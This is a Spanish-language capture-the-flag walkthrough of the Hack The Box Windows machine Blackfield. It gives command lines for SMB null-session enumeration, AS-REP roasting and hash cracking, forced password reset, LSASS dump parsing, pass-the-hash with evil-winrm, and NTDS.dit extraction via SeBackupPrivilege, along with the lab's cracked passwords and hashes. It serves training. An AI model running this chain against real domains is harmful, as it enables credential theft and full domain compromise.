# Blackfield

![](../../../../~gitbook/image.md)Publicado: 27 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Hard
OS: Windows
###📝 Descripción
Blackfield es una máquina Windows de nivel Hard que presenta un entorno de Active Directory complejo y desafiante. Esta máquina está diseñada para poner a prueba habilidades avanzadas de pentesting en entornos empresariales Windows, incluyendo técnicas de reconocimiento de AD, explotación de privilegios específicos de Windows y escalada de privilegios mediante abuso de funcionalidades del sistema operativo.La máquina simula un controlador de dominio corporativo con múltiples servicios expuestos, incluyendo SMB, LDAP, Kerberos y WinRM. El vector de ataque inicial requiere un enfoque meticuloso de enumeración para descubrir usuarios válidos del dominio y explotar configuraciones débiles de autenticación.Objetivos de Aprendizaje:- Enumeración avanzada de servicios de Active Directory
- Técnicas de AS-REP Roasting para obtener hashes de autenticación
- Explotación de permisos específicos de AD (ForceChangePassword)
- Análisis forense de volcados de memoria LSASS
- Abuso del privilegio SeBackupPrivilege para escalada de privilegios
- Extracción y análisis de la base de datos NTDS.dit

###🎯 Información General
AtributoValorNombreBlackfieldIP10.10.10.192DificultadHardOSWindows Server 2019Puntos40Creadoradf11
###📊 Resumen de la Explotación

####🔗 Cadena de Ataque

####🎯 Puntos Clave
- Vector inicial: Enumeración SMB sin autenticación
- Técnica crítica: AS-REP Roasting para obtener primer acceso
- Escalada lateral: Abuso de permisos AD (ForceChangePassword)
- Análisis forense: Extracción de credenciales desde volcado LSASS
- Escalada final: Explotación de SeBackupPrivilege para acceso total

###🛠️ Herramientas Utilizadas
HerramientaPropósitonmapReconocimiento y enumeración de puertossmbclientEnumeración de recursos SMBnetexecEnumeración de usuarios y recursosimpacketAtaques AS-REP Roasting y KerberoastingbloodhoundAnálisis de rutas de ataque en ADpypykatzAnálisis de volcados de memoria LSASSevil-winrmShell interactivo en Windows via WinRMhashcatCracking de hashes
###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
PuertoServicioDescripción53DNSServicio DNS del dominio88KerberosAutenticación del dominio135MSRPCLlamadas a procedimientos remotos389/3268LDAPDirectorio activo445SMBRecursos compartidos593RPC over HTTPLlamadas RPC via HTTP5985WinRMAdministración remota Windows🔥 Servicios críticos identificados:- SMB (445): Potencial acceso a recursos compartidos
- LDAP (389): Información del directorio activo
- Kerberos (88): Posibles ataques AS-REP/Kerberoasting
- WinRM (5985): Shell remoto si obtenemos credenciales

###🌐 Enumeración de Servicios

####🗂️ SMB (Puerto 445) - Acceso Inicial
Ya que no disponemos de credenciales, comenzamos tratando de enumerar posibles recursos mediante una sesión nula:📁 Enumeración de recursos compartidos![](../../../../~gitbook/image.md)👥 Enumeración de usuarios📝 Nota: Se identificaron más de 300 usuarios del dominio mediante RID brute force.Nos conectamos al recurso profiles$ y descargamos el contenido en nuestro host de ataque, pero tras revisarlo no encontramos nada de interés:![](../../../../~gitbook/image.md)
###🎫 Ataques de Autenticación Kerberos

####🎯 AS-REP Roasting
Verificamos si alguno de los usuarios obtenidos no tiene habilitada la pre-autenticación de kerberos y podemos realizar un ataque de tipo AS-Rep Roasting:![](../../../../~gitbook/image.md)🎉 ¡Éxito! Encontramos que la cuenta support no tiene la pre-autenticación de kerberos habilitada y logramos obtener un ticket.Alternativa usando kerbrute:![](../../../../~gitbook/image.md)
####🔓 Cracking del Hash
![](../../../../~gitbook/image.md)Procedemos a intentar crackearlo usando hashcat y rockyou.txt:![](../../../../~gitbook/image.md)🔑 Credencial obtenida: `support:#00^BlackKnight`
####🎪 Verificación Kerberoasting
Intentamos sin éxito un ataque de kerberoasting:
###🩸 Análisis con BloodHound

####📊 Recolección de Datos
Ahora que disponemos de una cuenta unida al dominio con credenciales, usamos bloodhound-python para obtener un mapeo del dominio:Es importante realizar una configuración adicional introduciendo el nombre de la máquina y el FQDN en `/etc/hosts`:![](../../../../~gitbook/image.md)
####🔍 Análisis de Rutas de Ataque
Al cargar los datos en bloodhound vemos que el usuario support tiene el privilegio ForceChangePassword sobre el usuario audit2020:![](../../../../~gitbook/image.md)
###🔄 Escalada Lateral - Abuso de ForceChangePassword

####💡 Explotación del Privilegio
Primero intentamos usar bloodyAD, pero falla debido a restricciones LDAP:Error: `LDAPBindException: LDAP Bind failed! Result code: "invalidCredentials"`
####🛠️ Métodos Alternativos
Método 1: Comando `net`Método 2: Comando `rpcclient`![](../../../../~gitbook/image.md)
####📂 Acceso al Recurso Forensic
Una vez cambiada la contraseña, verificamos acceso a recursos compartidos:![](../../../../~gitbook/image.md)🎯 ¡Acceso obtenido! Tenemos permisos de lectura sobre el recurso forensic.
###🕵️ Análisis Forense

####📥 Descarga de Archivos
Nos conectamos al recurso forensic y descargamos el contenido:![](../../../../~gitbook/image.md)
####🗂️ Estructura de Archivos Encontrados
- commands_output: Volcados de comandos ejecutados en la máquina
- memory_analysis: Archivos comprimidos con volcados de memoria
- tools: Herramientas como sysinternals y volatility

####🧠 Análisis del Volcado LSASS
El archivo más crítico encontrado es `lsass.zip`:🔧 Uso de pypykatzInstalamos y usamos pypykatz para analizar el volcado:![](../../../../~gitbook/image.md)
####🔑 Extracción de Hashes
UsuarioHash NTEstadosvc_backup9658d1d1dcd9250115e2205d9f48400d✅ VálidoDC01$b624dc83a27cc29da11d9bf25efea796❌ InválidoAdministrator7f1e4ff8c6a8e6b6fcae2d9c0572cd62❌ Inválido
###💻 Acceso Inicial al Sistema

####🏃 Conexión WinRM
Utilizamos el hash válido de svc_backup para conectarnos:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####🏁 Primera Flag

####📋 Enumeración de Privilegios
![](../../../../~gitbook/image.md)En el directorio `C:\` encontramos un archivo `notes.txt` con información adicional.![](../../../../~gitbook/image.md)Información crítica identificada:- ✅ Pertenece al grupo Backup Operators
- ✅ Tiene el privilegio SeBackupPrivilege habilitado

###🎁 Escalada de Privilegios - Abuso de SeBackupPrivilege

####💡 Concepto del Ataque
El privilegio `SeBackupPrivilege` permite realizar copias de seguridad de archivos críticos del sistema:- `SYSTEM` (Clave de registro del sistema)
- `SAM` (Security Account Manager)
- `NTDS.dit` (Base de datos de Active Directory)

####📋 Preparación del Entorno
Paso 1: Crear script VSS para montar copia de volumen:Paso 2: Descargar DLLs necesarias:Paso 3: Transferir archivos al host víctima:
####💾 Extracción de la Base de Datos NTDS
Paso 4: Ejecutar script VSS:Paso 5: Extraer archivos críticos:
####🔓 Extracción de Todos los Hashes
Descargamos los archivos críticos a nuestro host atacante:Utilizamos `impacket-secretsdump` para extraer todos los hashes del dominio:![](../../../../~gitbook/image.md)
###👑 Acceso como Administrator

####🔥 Pass-the-Hash Final
Con el hash NT del Administrator extraído, realizamos el ataque final:
####🏆 Flag Final
Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Información General](#informacion-general)
- [📊 Resumen de la Explotación](#resumen-de-la-explotacion)
- [🛠️ Herramientas Utilizadas](#herramientas-utilizadas)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🎫 Ataques de Autenticación Kerberos](#ataques-de-autenticacion-kerberos)
- [🩸 Análisis con BloodHound](#analisis-con-bloodhound)
- [🔄 Escalada Lateral - Abuso de ForceChangePassword](#escalada-lateral-abuso-de-forcechangepassword)
- [🕵️ Análisis Forense](#analisis-forense)
- [💻 Acceso Inicial al Sistema](#acceso-inicial-al-sistema)
- [🎁 Escalada de Privilegios - Abuso de SeBackupPrivilege](#escalada-de-privilegios-abuso-de-sebackupprivilege)
- [👑 Acceso como Administrator](#acceso-como-administrator)

```
❯ ping -c2 10.10.10.192
PING 10.10.10.192 (10.10.10.192) 56(84) bytes of data.
64 bytes from 10.10.10.192: icmp_seq=1 ttl=127 time=44.6 ms
64 bytes from 10.10.10.192: icmp_seq=2 ttl=127 time=47.6 ms

--- 10.10.10.192 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 44.611/46.095/47.579/1.484 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.192 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,389,445,593,3268,5985
```

```
nmap -sC -sV -p$ports 10.10.10.192 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 19:34 CEST
Nmap scan report for 10.10.10.192
Host is up (0.046s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-27 00:36:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-27T00:36:11
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h01m55s
```

```
echo "10.10.10.192 blackfield.local" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.10.192

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
forensic        Disk      Forensic / Audit share.
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
profiles$       Disk
SYSVOL          Disk      Logon server share
```

```
netexec smb 10.10.10.192  -u 'anonymous' -p '' --shares
```

```
netexec smb 10.10.10.192 -u 'anonymous' -p '' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
Administrator
Guest
krbtgt
DC01$
audit2020
support
BLACKFIELD764430
BLACKFIELD538365
[... usuarios truncados por brevedad ...]
svc_backup
lydericlefebvre
PC01$
PC02$
[... más usuarios ...]
```

```
smbclient //10.10.10.192/profiles$ -N -c "recurse ON; prompt OFF; mget *"
```

```
impacket-GetNPUsers -dc-ip 10.10.10.192 blackfield.local/ -usersfile Users.txt -format hashcat
```

```
kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local ./users.txt --downgrade
```

```
hashcat -m 18200 -a 0 support_kerberos_hash /usr/share/wordlists/rockyou.txt
```

```
impacket-GetUserSPNs blackfield.local/support:'#00^BlackKnight' -dc-ip 10.10.10.192 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

```
bloodhound-python -u 'support' -p '#00^BlackKnight' -d blackfield.local -c All --zip -ns 10.10.10.192
```

```
bloodyAD -u 'support' -p '#00^BlackKnight' -d blackfield.local --dc-ip 10.10.10.192 set password audit2020 'Password123!'
```

```
net rpc password audit2020 -U 'support' -S 10.10.10.192
```

```
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "Password123!"'
```

```
netexec smb 10.10.10.192 -u audit2020 -p 'Password123!' --shares
```

```
smbclient \\\\10.10.10.192\\forensic -U "audit2020"
# O alternativamente:
sudo mount -t cifs //10.10.10.192/forensic /mnt/forensic -o 'username=audit2020,password=Password123!'
```

```
unzip lsass.zip
```

```
pip3 install pypykatz
pypykatz lsa minidump lsass.DMP > resultados.txt
```

```
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
[USER FLAG OBTENIDA]
```

```
cat > vss.dsh
```
unix2dos vss.dsh
```

```
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeCmdLets.dll
wget https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeUtils.dll
```

```
upload vss.dsh c:\\Temp\\vss.dsh
upload SeBackupPrivilegeCmdLets.dll c:\\Temp\\SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll c:\\Temp\\SeBackupPrivilegeUtils.dll
```

```
*Evil-WinRM* PS C:\Temp> diskshadow /s c:\\Temp\\vss.dsh
```

```
# Importar módulos de SeBackupPrivilege
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll

# Copiar NTDS.dit desde la copia de volumen
*Evil-WinRM* PS C:\Temp> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\Temp\\ntds.dit

# Extraer claves de registro SYSTEM
*Evil-WinRM* PS C:\Temp> reg save HKLM\SYSTEM SYSTEM.SAV
```

```
download ntds.dit
download SYSTEM.SAV
```

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL > hashes_blackfield_domain
```

```
evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[ROOT FLAG OBTENIDA]
```
